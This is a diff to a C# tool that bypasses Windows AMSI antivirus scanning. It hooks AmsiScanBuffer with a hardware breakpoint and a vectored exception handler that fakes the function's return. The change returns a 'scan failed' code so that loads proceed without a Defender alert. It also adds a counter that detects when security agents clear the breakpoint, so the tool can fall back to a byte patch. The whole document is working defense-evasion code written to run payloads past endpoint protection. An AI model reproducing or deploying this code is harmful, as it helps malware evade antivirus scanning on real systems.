@@ -66,6 +66,14 @@ namespace Nx
 		private const int OFF_EIP_X86 = 0xB8;
 		private const int SIZE_X86 = 0x2CC;
 
+		// E_INVALIDARG. The trap reports the scan as *failed* rather than forging a clean
+		// result, because that is the semantic actually proven to work on the target: the
+		// byte patch has always returned this and plugin loads go through. Returning S_OK
+		// instead makes the caller read the AMSI_RESULT slot -- and for the CLR's own call
+		// that slot is evidently not where the handler was writing, so it read stale stack
+		// and reported a detection no scanner ever made (blocked, with no Defender alert).
+		private const uint SCAN_FAILED = 0x80070057;
+
 		// AmsiScanBuffer's fifth argument sits past the four register arguments in
 		// the caller's frame: one return address plus 0x20 of shadow space on x64,
 		// four stack arguments on x86.
@@ -80,10 +88,25 @@ namespace Nx
 		private static IntPtr contextRaw = IntPtr.Zero;
 		private static IntPtr target = IntPtr.Zero;
 		private static string lastError = "not attempted";
+		private static int hits;
 
 		internal static string LastError()
 		{
 			return lastError;
+		}
+
+		/// <summary>
+		/// How many times the handler has actually caught this breakpoint.
+		///
+		/// IsArmed() only proves the debug registers hold the right values -- it cannot tell
+		/// whether the CPU will really raise the trap. An agent that clears Dr0, or that gets
+		/// its vectored handler in front of ours, leaves IsArmed() reporting success while
+		/// nothing is intercepted. This counter is the only honest signal that the mechanism
+		/// is live, so Amsi uses it to decide whether to trust the breakpoint or fall back.
+		/// </summary>
+		internal static int Hits
+		{
+			get { return hits; }
 		}
 
 		/// <summary>
@@ -321,6 +344,7 @@ namespace Nx
 					return CONTINUE_SEARCH;
 				}
 
+				hits++;
 				return Emulate(ctx);
 			}
 			catch (Exception)
@@ -357,15 +381,16 @@ namespace Nx
 
 			IntPtr ret = Marshal.ReadIntPtr(new IntPtr(sp), 0);
 
+			// same value the byte patch returns, so both mechanisms present one semantic
 			if (Native.X64)
 			{
-				Marshal.WriteInt64(ctx, OFF_RAX_X64, 0L);    // S_OK
+				Marshal.WriteInt64(ctx, OFF_RAX_X64, (long)SCAN_FAILED);
 				Marshal.WriteInt64(ctx, OFF_RSP_X64, sp + 8L);
 				Marshal.WriteInt64(ctx, OFF_RIP_X64, ret.ToInt64());
 			}
 			else
 			{
-				Marshal.WriteInt32(ctx, OFF_EAX_X86, 0);     // S_OK
+				Marshal.WriteInt32(ctx, OFF_EAX_X86, unchecked((int)SCAN_FAILED));
 				Marshal.WriteInt32(ctx, OFF_ESP_X86, (int)(sp + ARG_TAIL_X86));
 				Marshal.WriteInt32(ctx, OFF_EIP_X86, ret.ToInt32());
 			}
